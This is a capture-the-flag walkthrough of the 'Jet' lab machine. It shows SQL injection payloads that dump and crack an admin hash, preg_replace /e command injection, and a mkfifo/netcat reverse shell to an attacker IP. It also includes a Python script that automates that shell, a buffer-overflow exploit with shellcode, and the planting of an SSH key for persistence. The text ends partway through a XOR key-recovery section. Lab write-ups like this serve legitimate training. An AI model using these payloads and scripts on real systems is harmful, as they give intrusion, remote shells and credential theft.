
### Connect

#### JET{s4n1ty_ch3ck}

  

We start the machine by scanning the machine's ports with `nmap`, we find several open ports including the one `22`that is `ssh`and `80`that is a service`http`

```
❯ nmap 10.13.37.10
Nmap scan report for 
PORT     STATE SERVICE  
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5555/tcp open  freeciv
7777/tcp open  cbt
```

  

If we look at the web page we can see a default page and also the`flag`

[
![](https://xchg2pwn.github.io/fortresses/jet/1.png)





We can see it from the console with a request `curl`by clicking on the string`JET`

```
❯ curl -s 10.13.37.10 | grep JET  
<b> JET{s4n1ty_ch3ck} </b>
```

  

  

### Digging in...

#### JET{w3lc0me_4nd_h@v3_fun!}

  

When we try to apply `fuzzing`to the website we only find several files `.ht`, however they return a code `403`so we simply do not have access

```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.37.10/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.10/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000023:   403        7 L      11 W       178 Ch      ".hta"
000000024:   403        7 L      11 W       178 Ch      ".htaccess"
000000025:   403        7 L      11 W       178 Ch      ".htpasswd"
```

  

We have the port open `53`so we can perform a reverse resolution query `DNS`to obtain an `domain`associated with the IP address

- `dig`: This is the command itself, used to query DNS servers.
- `@10.13.37.10`: This specifies the DNS server to query. In this case, it is using the DNS server at the IP address `10.13.37.10`.
- `-x 10.13.37.10`: This is the reverse lookup flag, which asks for the PTR (Pointer) record associated with the IP address `10.13.37.10`. A reverse lookup is used to find the domain name associated with an IP address.


```
❯ dig @10.13.37.10 -x 10.13.37.10

; <<>> DiG 9.18.12-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 19872
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800  

;; Query time: 96 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Tue Apr 11 12:20:24 EDT 2023
;; MSG SIZE  rcvd: 109
```

  

So that it knows where to resolve each time we point to it `doamin`, we add to the file `/etc/hosts`the address `ip`of the machine followed by the domain we have

```
❯ echo "10.13.37.10 www.securewebinc.jet" | sudo tee -a /etc/hosts  
```

  

By visiting the website this time from the `domain`at the bottom we can another`flag`



![](https://xchg2pwn.github.io/fortresses/jet/2.png)





  

### Going Deeper

#### JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}

  

In the `codigo`source of the page we can see that it loads 2 files with the extension `js`, one is the template and the other has a quite interesting name:`secure.js`



![](https://xchg2pwn.github.io/fortresses/jet/3.png)




We open it and we find that it is not in clear text but in decimal



![](https://xchg2pwn.github.io/fortresses/jet/4.png)





We can see it more comfortably from a request `curl`, the script converts the decimals to text with `fromCharCode`the String class and executes it with`eval`

```
❯ curl -s www.securewebinc.jet/js/secure.js
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));  
```

  

Instead of running it `eval`after passing it to text, we can use a simple `console.log`to display the content in text through the console

```
console.log(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));  
```

  

When we run it we can see that it makes a request to `stats.php`a directory `ruta`that would have been impossible to obtain by applying brute force.
![[Pasted image 20240530235213.png]]

```
❯ js secure.js
function getStats()
{
    $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",  

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);
```

  

By pointing to the directory and the file `stats.php`we can see that it returns only one `numero`that is really not entirely clear what its purpose is.

[

![](https://xchg2pwn.github.io/fortresses/jet/5.png)





If we remove the `stats.php`and stay on, `/admin`it redirects us to`login.php`

[

![](https://xchg2pwn.github.io/fortresses/jet/6.png)





At the `codigo`source `login.php`we find the `flag`in a comment

[

![](https://xchg2pwn.github.io/fortresses/jet/7.png)





  

### Bypass Authentication

#### JET{sQl_1nj3ct1ons_4r3_fun!}

  

We have a `login`default credentials as `admin:admin`they will not work for us

[

![](https://xchg2pwn.github.io/fortresses/jet/8.png)





However, when passing `admin' and sleep(5)-- -`the website as a name, it takes `5`seconds to give us a response, which means that it is vulnerable to a`inyeccion sql`



![](https://xchg2pwn.github.io/fortresses/jet/10.png)





By intercepting the request with `burpsuite`we can see how the data is processed


![](https://xchg2pwn.github.io/fortresses/jet/9.png)





Let's go with the easy way, we start by saving the request in a file`request`

```
❯ cat request
POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1  
Host: www.securewebinc.jet
Content-Length: 47
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.securewebinc.jet
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9,en;q=0.8
Cookie: PHPSESSID=3aljq5nfoi1t34idu2dkm55nt2
Connection: close

username=admin&password=admin
```

  

We can use `sqlmap`passing it with `-r`the request file and with the parameter `-dbs`we list the databases, we can find the db`jetadmin`

```
❯ sqlmap -r request --batch -dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:11:01] [INFO] parsing HTTP request from 'request'
[12:11:03] [INFO] resuming back-end DBMS 'mysql' 
[12:11:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7805 FROM (SELECT(SLEEP(5)))BrBS)-- vOGO&password=admin  
---
[12:11:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[12:11:03] [INFO] fetching database names
[12:11:03] [INFO] resumed: 'information_schema'
[12:11:03] [INFO] resumed: 'jetadmin'
available databases [2]:
[*] information_schema
[*] jetadmin
```

  

Now we list the tables with `-tables`indicating the database `jetadmin`with parameter `-D`, we can find only the table `users`in that database

```
❯ sqlmap -r request --batch -D jetadmin -tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:12:49] [INFO] parsing HTTP request from 'request'
[12:12:49] [INFO] resuming back-end DBMS 'mysql' 
[12:12:49] [INFO] testing connection to the target URL
[12:12:50] [INFO] the back-end DBMS is MySQL
[12:12:50] [INFO] fetching tables for database: 'jetadmin'  
[12:12:50] [INFO] resumed: 'users'
Database: jetadmin
[1 table]
+-------+
| users |
+-------+
```

  

Now we can simply use the parameter `-dump`to dump all the existing columns in the users table and we get a `hash`user`admin`

```
❯ sqlmap -r request --batch -D jetadmin -T users -dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:14:33] [INFO] parsing HTTP request from 'request'
[12:14:34] [INFO] resuming back-end DBMS 'mysql' 
[12:14:34] [INFO] testing connection to the target URL
[12:14:34] [INFO] the back-end DBMS is MySQL
[12:14:34] [INFO] fetching columns for table 'users' in database 'jetadmin'
[12:14:34] [INFO] resumed: 'id'
[12:14:34] [INFO] resumed: 'int(11)'
[12:14:34] [INFO] resumed: 'username'
[12:14:34] [INFO] resumed: 'varchar(50)'
[12:14:34] [INFO] resumed: 'password'
[12:14:34] [INFO] resumed: 'varchar(191)'
[12:14:34] [INFO] fetching entries for table 'users' in database 'jetadmin'
[12:14:34] [INFO] resumed: '1'
[12:14:34] [INFO] resumed: '97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084'  
[12:14:34] [INFO] resumed: 'admin'
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```

  

We saw that it can be enumerated with a `sql injection`time based, however when sending only one `'`as a username field it returns a 302 but first a`error`

[

![](https://xchg2pwn.github.io/fortresses/jet/16.png)





Based on an [article](https://securiumsolutions.com/blog/sql-injection-by-double-query-securiumsolutions/) we can create an `query`sqli `error based` `doble query`to list the database in use with`database()`

```
' or (select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -  
```

  

Keep in mind that to send it we need `urlcondearlo`to do it from Burpsuite with `Ctrl U`, we send it and see the response`jetadmin`

[

![](https://xchg2pwn.github.io/fortresses/jet/17.png)





We follow the same logic to read the databases, as it returns several results we will limit ourselves to one with `limit 0,1`, we see`information_schema`

```
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
```

  
[

![](https://xchg2pwn.github.io/fortresses/jet/18.png)





We can concatenate several `querys`so we add a `0x20`for a space and copy the `query`this time changing `0,1`by `1,1`to see both results

```
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),0x20,(select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 1,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
```

  
[

![](https://xchg2pwn.github.io/fortresses/jet/19.png)





Only the database exists `jetadmin`so we will list its`tablas`

```
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(table_name as nchar),0x20)),1,54) from information_schema.tables where table_schema='jetadmin' limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
```

  
[

![](https://xchg2pwn.github.io/fortresses/jet/20.png)





In the database `jetadmin`there is only the table `users`, so we can list its `columnas`, in this case we only find 3 `id`, `username`and`password`

```
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 0,1),0x20,(select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 1,1),0x20,(select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 2,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
```

  
[

![](https://xchg2pwn.github.io/fortresses/jet/21.png)





Finally we dump the columns `username`and `password`separating them by`:`

```
' or (select 1 from(select count(*),concat((select mid((ifnull(cast(username as nchar),0x20)),1,54) from users limit 0,1),0x3a,(select mid((ifnull(cast(password as nchar),0x20)),1,54) from users limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -  
```

  
[

![](https://xchg2pwn.github.io/fortresses/jet/22.png)





We have the `hash`admin one, we pass it to `john`and we get his password

```
❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-SHA256  
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 XOP 4x2])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Hackthesystem200 (?)
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

  

We can log in `admin`with the credentials `admin`we got

[

![](https://xchg2pwn.github.io/fortresses/jet/11.png)





Now we can see a dashboard and in one of the messages we find the`flag`

[

![](https://xchg2pwn.github.io/fortresses/jet/12.png)





  

### command

#### JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}

  

In the dashboard, among other things, we see a field where we can send`correos`



![](https://xchg2pwn.github.io/fortresses/jet/13.png)





So we send an email simply filling out all the fields with `test`, when sending it it tells us to modify the message to pass the profanity filter

[

![](https://xchg2pwn.github.io/fortresses/jet/23.png)



](https://xchg2pwn.github.io/fortresses/jet/23.png)

Intercepting the request, in addition to our entered fields, we can see several with `swearwords`as a prefix, and change them for other words, we also see uses`/i`

[

![](https://xchg2pwn.github.io/fortresses/jet/14.png)





Reading an [article](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) about the function `preg_replace()`we can see that `/i`it is used to be case instinctive but we can use it `/e`as a php interpreter, so we can change it and inject code `php`to execute the command`id`

[preg_replace()](https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df)


```
swearwords[/fuck/i]=make+love
swearwords[/fuck/e]=system('id')  
```

  

We can eliminate unnecessary fields, by changing our data so that the command is executed `id`we can see the user's output reflected`www-data`

[

![](https://xchg2pwn.github.io/fortresses/jet/15.png)





We change our `id`to a payload with `mkfifo`and `nc`to send a revshell and our data is the following, there are special characters so we urlencode it

```
swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.9+4444+>/tmp/f')&to=test@test.com&subject=test&message=fuck&_wysihtml5_mode=1  
```

  

We send the data and receive a shell as `www-data`on the victim machine

[

![](https://xchg2pwn.github.io/fortresses/jet/24.png)




```
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.10 
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ hostname -I  
10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```

  

Although it is not necessary as an extra to automate gaining access, we can create a `script`Python script that authenticates and sends the request with the`revshell`

```
#!/usr/bin/python3
import requests, sys
from pwn import log

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <lhost> <lport>")
    sys.exit(1)

target = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin"
session = requests.Session()

auth = {"username": "admin", "password": "Hackthesystem200"}
data = {"swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.9 4444 >/tmp/f')", "to": "test@test.com", "subject": "test", "message": "fuck", "_wysihtml5_mode": 1}  

session.post(target + "/dologin.php", data=auth)
session.post(target + "/email.php", data=data)
```

  

We execute it by passing it our ip and port as `argumentos`and we obtain the shell

```
❯ python3 exploit.py 10.10.14.10 443  
```

  

```
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ hostname -I  
10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```

  

Looking at the existing files in the current directory we see the `flag`, we read it

```
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ ls -l
-rw-r--r--  1 root root        33 Dec 20  2017 a_flag_is_here.txt
-rwxr-x---  1 root www-data   157 Jan  3  2018 auth.php
-rwxr-x---  1 root www-data    39 Dec 20  2017 badwords.txt
drwxr-x--- 32 root www-data  4096 Dec 20  2017 bower_components
drwxr-x---  6 root www-data  4096 Oct  9  2017 build
-rwxr-x---  1 root www-data    82 Dec 20  2017 conf.php
-rwxr-x---  1 root www-data 44067 Dec 27  2017 dashboard.php
-rwxr-x---  1 root www-data   600 Dec 20  2017 db.php
drwxr-x---  5 root www-data  4096 Oct  9  2017 dist
-rwxr-x---  1 root www-data   820 Dec 27  2017 dologin.php
-rwxr-x---  1 root www-data  2881 Dec 27  2017 email.php
-rwxr-x---  1 root www-data    43 Dec 20  2017 index.php
drwxr-x---  2 root www-data  4096 Dec 20  2017 js
-rwxr-x---  1 root www-data  3606 Dec 20  2017 login.php
-rwxr-x---  1 root www-data    98 Dec 20  2017 logout.php
drwxr-x--- 10 root www-data  4096 Dec 20  2017 plugins
-rwxr-x---  1 root www-data    21 Nov 14  2017 stats.php
drwxrwxrwx  2 root www-data  4096 Dec 20  2017 uploads
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat a_flag_is_here.txt  
JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```

  

  

### Overflown

#### JET{0v3rfL0w_f0r_73h_lulz}

  

Searching for privileged files `suid`we found one out of the ordinary,`leak`

```
www-data@jet:~$ find / -perm -4000 2>/dev/null  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/lib/uncompress.so
/home/leak
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/ping6
www-data@jet:~$
```

  

The file `leak`belongs to the user `alex`, it seems to be an executable that gives us an address and asks us to exploit it, so it is probably a challenge

```
www-data@jet:~$ ls -l /home/leak
-rwsr-xr-x 1 alex alex 9112 Dec 12  2017 /home/leak  
www-data@jet:~$ /home/leak
Oops, I'm leaking! 0x7ffe4e813060
Pwn me ¯\_(ツ)_/¯ 
>
```

  

To exploit it we first need to parse it locally, so we will download it, we can do it easily using `netcat`to send and receive it

```
www-data@jet:~$ netcat 10.10.14.10 4444 < /home/leak  
www-data@jet:~$
```

  

```
❯ netcat -lvnp 4444 > leak
Listening on 0.0.0.0 4444
Connection received on 10.13.37.10  
```

  

We can start by analyzing the binary with `ida`, we can see the function`main`

[

![](https://xchg2pwn.github.io/fortresses/jet/25.png)





It starts by defining a variable `string`with a `64`byte buffer, then prints a message and the `dirección`where it starts `string`, and receives the input with`fgets`

```
int __fastcall main(int argc, const char **argv, const char **envp)  
{
  char string[64]; // [rsp+0h] [rbp-40h] BYREF

  _init(argc, argv, envp);
  printf("Oops, I'm leaking! %p\n", string);
  puts(aPwnMe);
  printf("> ");
  fgets(string, 512, stdin);
  return 0;
}
```

  

The function `fgets`is vulnerable to `Buffer Overflow`also shows us the address of the input, and `checksec`we can also see that the binary does not have`protecciones`

```
❯ checksec leak
[*] '/home/kali/leak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)  
    RWX:      Has RWX segments
```

  

We start by creating a `patron`specially designed character with `gdb`and running the program passing the pattern like `input`, the program is corrupted

```
❯ gdb -q ./leak
Reading symbols from leak...
(No debugging symbols found in leak)
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/kali/leak
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Oops, I'm leaking! 0x7fffffffe530
Pwn me ¯\_(ツ)_/¯ 
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
pwndbg>
```

  

We can see the offset using `pattern_offset`gdb, just passing it the value of the register `RSP`, we need `72`bytes before overwriting the register`RIP`

```
pwndbg> x/gx $rsp
0x7fffffffe578:	0x616161616161616a
pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)  
Found at offset 72
pwndbg>
```

  

This time we create a string of `72 A`and `8 B`to be able to debug the address

```
❯ python3 -q
>>> "A" * 72 + "B" * 8
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'  
>>>
```

  

Now we run the program passing our string like `input`, it is corrupted

```
❯ gdb -q ./leak
Reading symbols from leak...
(No debugging symbols found in leak)
pwndbg> run
Starting program: /home/kali/leak
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Oops, I'm leaking! 0x7fffffffe530
Pwn me ¯\_(ツ)_/¯ 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
pwndbg>
```

  

If we see the content of the address `lekeada`when running the program we can verify that it is indeed the one `direccion`at the beginning of our`input`

```
pwndbg> x/10gx 0x7fffffffe530
0x7fffffffe530:	0x4141414141414141	0x4141414141414141  
0x7fffffffe540:	0x4141414141414141	0x4141414141414141  
0x7fffffffe550:	0x4141414141414141	0x4141414141414141  
0x7fffffffe560:	0x4141414141414141	0x4141414141414141  
0x7fffffffe570:	0x4141414141414141	0x4242424242424242  
pwndbg>
```

  

In order to run the exploit that we will do from our machine we will play with `socat`so that the program runs and we have access from the port`9999`

```
www-data@jet:~$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &  
[1] 7321
www-data@jet:~$
```

  

We start a `script`python to exploit it by importing the library `pwn`and defining a [shellcode](https://www.exploit-db.com/shellcodes/46907) that will execute one `/bin/sh`in `64`bits

```
#!/usr/bin/python3
from pwn import remote, p64

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  
```

  

We define the `offset`one we know and fill in with `A`until we reach`RIP`

```
offset = 72
junk = b"A" * (offset - len(shellcode))  
```

  

Now we define the connection to the machine and wait to receive the message

```
shell = remote("10.13.37.10", 9999)
shell.recvuntil(b"Oops, I'm leaking! ")  
```

  

We receive the address `lekeada`and convert it to `decimal`, followed by that with the function `p64`we give it the format that python needs to execute it in `64`bits

```
ret = p64(int(shell.recvuntil(b"\n"),16))
```

  

The payload will do the following, it will send the shellcode and the junk to reach it `RIP`, with which `dirección`we will return to the beginning of our `input`where our is `shellcode`in this way it will be executed, we define and send the`payload`

```
payload = shellcode + junk + ret  

shell.sendlineafter(b"> ", payload)
shell.interactive()
```

  

Our `script`ending would be the following, when we execute it we obtain a shell like`alex`

```
#!/usr/bin/python3
from pwn import remote, p64

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  

offset = 72
junk = b"A" * (offset - len(shellcode))

shell = remote("10.13.37.10", 9999)
shell.recvuntil(b"Oops, I'm leaking! ")

ret = p64(int(shell.recvuntil(b"\n"),16))

payload = shellcode + junk + ret  

shell.sendlineafter(b"> ", payload)
shell.interactive()
```

  

```
❯ python3 exploit.py 
[+] Opening connection to 10.13.37.10 on port 9999: Done  
[*] Switching to interactive mode
$ whoami
alex
$
```

  

We are `alex`, in our personal user directory we can find the`flag`

```
$ cd /home/alex
$ ls -l
-rw-r--r-- 1 root root  659 Jan  3  2018 crypter.py
-rw-r--r-- 1 root root 1481 Dec 28  2017 encrypted.txt
-rw-r--r-- 1 root root 7285 Dec 27  2017 exploitme.zip  
-rw-r--r-- 1 root root   27 Dec 28  2017 flag.txt
$ cat flag.txt
JET{0v3rfL0w_f0r_73h_lulz}
$
```

  

To connect by ssh and get a better shell we can create a directory `.ssh`and send our `id_rsa.pub`in the directory with the name`authorized_keys`

```
$ mkdir .ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > .ssh/authorized_keys  
$
```

  

Now we can connect as the user `alex`without password and read the`flag`

```
❯ ssh alex@10.13.37.10
alex@jet:~$ id
uid=1005(alex) gid=1005(alex) groups=1005(alex)  
alex@jet:~$ hostname -I
10.13.37.10 
alex@jet:~$ cat flag.txt  
JET{0v3rfL0w_f0r_73h_lulz}
alex@jet:~$
```

  

  

### Secret Message

#### JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}

  

We have several files in our home directory, a `.zip`, a `.txt`and a`.py`

```
alex@jet:~$ ls -l
-rw-r--r-- 1 root root  659 Jan  3  2018 crypter.py
-rw-r--r-- 1 root root 1481 Dec 28  2017 encrypted.txt
-rw-r--r-- 1 root root 7285 Dec 27  2017 exploitme.zip  
-rw-r--r-- 1 root root   27 Dec 28  2017 flag.txt
alex@jet:~$
```

  

To work more comfortably locally we can download the files taking advantage of the ssh connection using `scp`pointing to `*`for all files

```
❯ scp alex@10.13.37.10:"*" .
crypter.py                                   100%  659     3.4KB/s   00:00
encrypted.txt                                100% 1481     7.5KB/s   00:00
exploitme.zip                                100% 7285    38.0KB/s   00:00  
```

  

We start with the one `.zip`that is protected with a password that we do not know

```
❯ unzip exploitme.zip 
Archive:  exploitme.zip
[exploitme.zip] membermanager password:  
```

  

The script takes it `message.txt`and applies a `xor`using as `key`a password that we don't know, then saves it in the file called`encrypted.txt`

```
import binascii

def makeList(stringVal):
    list = []
    for c in stringVal:
        list.append(c)
    return list

def superCrypt(stringVal,keyVal):
    keyPos = 0
    key = makeList(keyVal)
    xored = []
    for c in stringVal:
        xored.append(binascii.hexlify(chr(ord(c) ^ ord(keyVal[keyPos]))))  
        if keyPos == len(key) - 1:
            keyPos = 0
        else:
            keyPos += 1
    hexVal = ''
    for n in xored:
        hexVal += n
    return hexVal

with open('message.txt') as f:
    content = f.read()

key = sys.argv[1]

with open('encrypted.txt', 'w') as f:
    output = f.write(binascii.unhexlify(superCrypt(content, key)))
```

  

Using `xortool`with the `encrypted.txt`we can determine a possible `longitud`, the highest probability is the `17`character length with a`15.7%`

```
❯ xortool encrypted.txt 
The most probable key lengths:
 1:  13.3%
 4:  13.8%
 8:  11.4%
12:  10.0%
14:   8.7%
17:  15.7%
20:   7.3%
24:   6.1%
28:   5.5%
34:   8.3%
Key-length can be 4*n
Most possible char is needed to guess the key!  
```

  

Now we indicate the `17`character length with `-l`and use `-c 20`since we are talking about a text file, we obtain an approximation of the password

```
❯ xortool -l 17 -c 20 encrypted.txt
18 possible key(s) of length 17:
secxrezebin&rocf~
secxrezebin&rbcf~
secxrezebin"rocf~
secxrezebin"rbcf~
secxrezebinnrocf~
...
Found 18 plaintexts with 95%+ valid characters
See files filename-key.csv, filename-char_used-perc_valid.csv  
```

  

The beginning of the password looks quite similar to the domain we know, so we can assume that the first characters are the domain name

```
www.securewebinc.jet

secxrezebinnrocf~
securewebinc*****
```

  

